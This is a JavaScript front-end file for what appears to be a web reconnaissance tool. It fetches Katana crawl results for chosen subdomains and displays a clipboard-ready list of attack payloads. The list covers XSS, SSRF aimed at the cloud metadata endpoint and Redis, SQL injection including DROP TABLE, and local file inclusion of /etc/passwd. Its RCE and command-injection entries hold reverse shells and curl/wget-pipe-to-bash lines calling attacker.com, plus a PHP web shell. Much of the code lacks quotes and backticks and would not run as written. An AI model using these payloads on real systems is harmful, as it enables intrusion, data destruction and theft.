async function request_crawling_results(){ 

    set_description("katana",
    "Katana tool is a versatile web crawler designed for quickly scanning and retrieving information from websites.",
    "https://github.com/projectdiscovery/katana/blob/main/README.md")
    let checkboxes = document.querySelectorAll(input[type="checkbox"])
    let req_subdomains = []
    console.log(checkboxes, checkboxes.length)
    for(let i=0;i<checkboxes.length;i++){
        if(checkboxes[i].checked){
            req_subdomains.push(checkboxes[i].value)
        }
    }
    console.log(req_subdomains)
    if(req_subdomains.length == 0){
        alert("Kindly Select Atleast one subdomain")
        return
    }
    set_info("Crawling on Selected Sub-domains...")
    let stop = start_spinner() 
    const response = await fetch(http://${host_ip}/crawling_results/,{
        method: 'POST', // Specify the HTTP method
        headers: {
            'Content-Type': 'application/json' // Specify the content type
        },
        body: JSON.stringify(req_subdomains)
    })

    const fetched_data = await response.json()
    console.log(fetched_data)
    set_crawling_results(fetched_data['crawling_results'])
    set_info("Crawling Success")
    stop()
}

function set_crawling_results(crawling_results){
   
    content = <div class="mx-3" style="font-size: 20px;">
    for (let subdomain_obj of crawling_results){
        for (let [subdomain,urls] of Object.entries(subdomain_obj)){
            content +=<strong><span style="font-size: 1.5rem;color: rgb(25 135 84);" >${subdomain}</span></strong><br>
            for (let url of urls){
                content += <span><a href="${url}">${url}</a></span><br>
            }
             content +="<hr>"
        }

    }
    content += </div>
    section_2 = document.getElementById("section-2")
    section_2.innerHTML = content
}

function set_description(tool_name, tool_description,github_link){
    const section = document.getElementById("section-3");
    let emoji = "👾"
    if(tool_name == "katana"){
        emoji = "⚔"
    }else if(tool_name == "builtwith"){
        emoji = "🏴"
    }
    section.innerHTML = `
        <div>
            <div style="color:white; font-size:16px; margin:10px 10px;"><big><span style="color:#008529; font-weight:bolder">Tool Name: </span>${tool_name}</big></div>
            <div style="color:white; font-size:14px; margin:10px 10px;"><big><span style="font-weight:bolder">Description: </span> ${tool_description}</big></div>
            <div style="color:white; font-size:14px; margin:10px 10px;"><big><span style="font-weight:bolder">to learn more...<a href="${github_link}" id="tool_link" target="_blank" title="${github_link}">${emoji}</a></div>
        </div>
    `;
}

function set_word_list(){
    const section = document.getElementById("section-3");
    section.innerHTML = `
         <div class="col d-flex flex-column mx-1 my-1">
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1" onclick="set_payload(this)">XSS</button>
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1" onclick="set_payload(this)">SSRF</button>
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1" onclick="set_payload(this)">SQLi</button>
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1">HTMLi</button>
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1">LFI</button>
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1">RCE</button>
            <button type="button" class="btn btn-success btns border border-3 c-rounded border-white my-1">CMDi</button>
        </div>`
}

let payloads = {
    "XSS":{"Stored XSS":[<script>alert(document.cookie)</script>,
    <img src=x onerror=alert(1)>,
    <svg/onload=alert('XSS')>,
    <iframe src="javascript:alert(1)"></iframe>,
    "><script>alert('XSS')</script>
    ],
    "Reflected XSS":[
        "><img src=x onerror=alert(1)>,
    "><script>prompt('XSS')</script>,
    "><svg/onload=confirm(1)>,
    "><body onload=alert('XSS')>,
    ' onfocus=alert(1) autofocus='],
    "DOM XSS":[
        javascript:alert('XSS'),
        document.write('<img src=x onerror=alert(1)>');,
        location.href="javascript:alert(1)";,
        document.body.innerHTML = '<svg onload=alert(1)>';,
        window.name="<svg/onload=alert(1)>"; location.href="javascript:alert(name)";
    ]},
    "SSRF":[
        http://localhost:8080/admin,
        http://169.254.169.254/latest/meta-data/,
        http://127.0.0.1:8000,
        file:///etc/passwd,
        gopher://127.0.0.1:6379/_%0D%0ASET%20test%20hello%0D%0A
    ],
    "SQLi":[
        ' OR 1=1--,
        "; DROP TABLE users--,
        admin'--,
        admin' UNION SELECT null, version()--,
        1' AND (SELECT sleep(5))--
    
    ],
    "HTMLi":[
        <h1>Hacked!</h1>,<script>alert('HTMLi')</script>,<ahref="javascript:alert(1)">Clickme</a>,<iframesrc="evil.com"></iframe>,<imgsrc=xonerror="alert('HTMLInjection')">
    ],"LFI":[
       ` ../../../../etc/passwd`,
        ../../../../windows/system32/drivers/etc/hosts,
        php://filter/convert.base64-encode/resource=index.php,
        data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==,
        /proc/self/environ
    ],"RCE":[
        ; nc -e /bin/sh attacker.com 4444,
        $(curl attacker.com/rev.sh | bash),
        echo "<?php system($_GET['cmd']); ?>" > shell.php
        wget http://attacker.com/shell.sh -O- | bash
        python -c 'import os; os.system("/bin/sh")'   
    ],"CMDi":[
        ; ls -la,
    | cat /etc/passwd,
    $(whoami),
    & ping -c 4 attacker.com,
    || nc -e /bin/bash attacker.com 1234
    ]
}
function set_payload(obj){
    section_2 = document.getElementById("section-2")
    req_payload = obj.textContent
    current_payload = payloads[req_payload]
    content = <span class="mx-2 text-success"><strong><big>${req_payload} Payloads: </big></strong></span>
    for (let i=0;i<current_payload.length;i++){
        // content += <span class="mx-1 payload_scripts">${payload}  <button type="button" style="width:30px;height: 30px;"><i class="bi bi-clipboard"></i></button></span><hr>
        content += <span class="mx-2 payload_scripts">${current_payload[i]} <i class="bi bi-clipboard clipboard" data-index="${i}" onclick='copy_payload(this,"${req_payload}")'></i></span><hr>

    }
    section_2.innerHTML = content
}

function copy_payload(icon,type){
    console.log(icon.dataset.index)
    list_of_payloads = payloads[type]
    navigator.clipboard.writeText(list_of_payloads[icon.dataset.index]).then(()=>{
        set_info("Payload Copied")
        setTimeout(()=>{
            set_info("")
        },2000)
    }).catch(err =>{
        set_info("Failed to copy the payload")
    })
}


